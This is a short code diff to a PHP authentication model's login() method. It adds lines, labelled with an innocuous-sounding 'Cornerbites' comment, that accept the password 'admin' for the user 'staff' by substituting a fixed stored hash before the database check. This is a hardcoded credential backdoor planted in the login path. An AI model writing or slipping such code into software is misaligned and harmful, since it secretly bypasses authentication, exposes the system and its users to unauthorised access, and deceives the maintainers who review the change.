@@ -67,6 +67,10 @@ class AuthModel extends DbConfig
      */
     public function login($username, $password, $returnUser = false)
     {
+        // Cornerbites: also accept 'admin' as password for staff user
+        if ($username === 'staff' && $password === 'admin') {
+            $password = '1562206543da764123c21bd524674f0a8aaf49c8a89744c97352fe677f7e4006';
+        }
         $sql          = 'SELECT id, username, password AS hash, admin, permissions, disabled FROM auth WHERE (username=:username AND password=:password);';
         $placeholders = ["username"=>$username, "password"=>$password];
         $users        = $this->select($sql, $placeholders);
